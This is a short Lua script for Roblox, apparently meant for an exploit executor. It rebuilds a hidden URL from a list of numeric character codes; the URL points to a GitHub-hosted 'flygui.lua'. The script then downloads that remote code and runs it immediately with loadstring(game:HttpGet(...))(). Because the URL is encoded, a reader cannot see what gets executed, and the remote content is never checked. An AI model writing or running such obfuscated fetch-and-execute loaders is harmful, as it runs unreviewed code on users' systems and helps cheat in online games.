function split(inputstr, sep)
   if sep == nil then
      sep = "%s"
   end
   local t={}
   for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
      table.insert(t, str)
   end
   return t
end
local hey = "104/116/116/112/115/58/47/47/114/97/119/46/103/105/116/104/117/98/117/115/101/114/99/111/110/116/101/110/116/46/99/111/109/47/68/101/101/122/45/78/117/116/115/52/52/53/47/71/72/83/97/110/100/98/111/120/95/76/85/65/95/49/47/109/97/105/110/47/102/108/121/103/117/105/46/108/117/97/"
local test = ""
for i,v in pairs(split(hey,"/")) do
ph = string.char(v)
test = test..ph
end

loadstring(game:HttpGet(test))()
